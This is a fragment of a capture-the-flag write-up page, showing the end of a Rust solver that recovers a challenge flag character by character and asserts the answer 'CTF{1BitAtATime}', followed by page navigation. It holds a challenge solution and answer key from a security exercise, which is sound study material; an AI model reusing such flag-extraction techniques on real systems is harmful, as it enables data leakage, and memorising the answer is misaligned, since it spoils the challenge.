    it </span><span style="color:#f92672;">-= </span><span style="color:#ae81ff;">1</span><span style="color:#f8f8f2;">;
    </span><span style="font-style:italic;color:#66d9ef;">Ok</span><span style="color:#f8f8f2;">(it)
}

#[tokio::main]
async </span><span style="font-style:italic;color:#66d9ef;">fn </span><span style="color:#a6e22e;">main</span><span style="color:#f8f8f2;">() -&gt; </span><span style="font-style:italic;color:#66d9ef;">Result</span><span style="color:#f8f8f2;">&lt;(), </span><span style="font-style:italic;color:#66d9ef;">Box</span><span style="color:#f8f8f2;">&lt;dyn Error&gt;&gt; {
    </span><span style="font-style:italic;color:#66d9ef;">let </span><span style="color:#f92672;">mut</span><span style="color:#f8f8f2;"> flag: </span><span style="font-style:italic;color:#66d9ef;">Vec</span><span style="color:#f8f8f2;">&lt;</span><span style="font-style:italic;color:#66d9ef;">u8</span><span style="color:#f8f8f2;">&gt; </span><span style="color:#f92672;">= </span><span style="color:#e6db74;">&quot;&quot;</span><span style="color:#f8f8f2;">.</span><span style="color:#66d9ef;">bytes</span><span style="color:#f8f8f2;">().</span><span style="color:#66d9ef;">collect</span><span style="color:#f8f8f2;">();
    </span><span style="color:#75715e;">// can&#39;t consistently crack the last two chars because there isn&#39;t space to make long binary tree branches
    // the last char is known to be } because of the flag format but the second to last char just needs to be guessed
    // it was pretty obviously e from the pattern
    </span><span style="color:#f92672;">for _ in </span><span style="color:#ae81ff;">0</span><span style="color:#f92672;">..</span><span style="color:#ae81ff;">14 </span><span style="color:#f8f8f2;">{
        </span><span style="font-style:italic;color:#66d9ef;">let</span><span style="color:#f8f8f2;"> next </span><span style="color:#f92672;">= </span><span style="color:#66d9ef;">discover_next</span><span style="color:#f8f8f2;">(</span><span style="color:#f92672;">&amp;</span><span style="color:#f8f8f2;">flag).await</span><span style="color:#f92672;">?</span><span style="color:#f8f8f2;">;
        flag.</span><span style="color:#66d9ef;">push</span><span style="color:#f8f8f2;">(next);
        println!(</span><span style="color:#e6db74;">&quot;flag thus far: </span><span style="color:#ae81ff;">{}</span><span style="color:#e6db74;">&quot;</span><span style="color:#f8f8f2;">, </span><span style="font-style:italic;color:#66d9ef;">String</span><span style="color:#f8f8f2;">::from_utf8_lossy(</span><span style="color:#f92672;">&amp;</span><span style="color:#f8f8f2;">flag));
    }
    assert_eq!( </span><span style="font-style:italic;color:#66d9ef;">String</span><span style="color:#f8f8f2;">::from_utf8_lossy(</span><span style="color:#f92672;">&amp;</span><span style="color:#f8f8f2;">flag) </span><span style="color:#f92672;">+ </span><span style="color:#e6db74;">&quot;e}&quot;</span><span style="color:#f8f8f2;">, </span><span style="color:#e6db74;">&quot;CTF{1BitAtATime}&quot;</span><span style="color:#f8f8f2;">);
    </span><span style="font-style:italic;color:#66d9ef;">Ok</span><span style="color:#f8f8f2;">(())
}
</span></code></pre>

                </div>
            </div>

            <div class="prev-link">
                
    
        <a class="previous" href="https:&#x2F;&#x2F;writeups.teddyheinen.com&#x2F;gctf-2020&#x2F;root-power&#x2F;"><</a>
    

            </div>

            <div class="next-link">
                
    
        
        
        
        
            
            
            
                
            
        
            
            
            
                
            
                
            
                
                    
                
            
        
            
            
                <a class="next" href="https:&#x2F;&#x2F;writeups.teddyheinen.com&#x2F;smc3&#x2F;">></a>
                
                
            
            
                
            
                
            
                
            
                
            
                
            
        
    

            </div>
        </div>

        
            
            <script type="text/javascript" src="https://writeups.teddyheinen.com/elasticlunr.min.js"></script>
            <script type="text/javascript" src="https://writeups.teddyheinen.com/search_index.en.js"></script>
            
            <script type="text/javascript" src="https://writeups.teddyheinen.com/book.js"></script>
        
    </body>

</html>
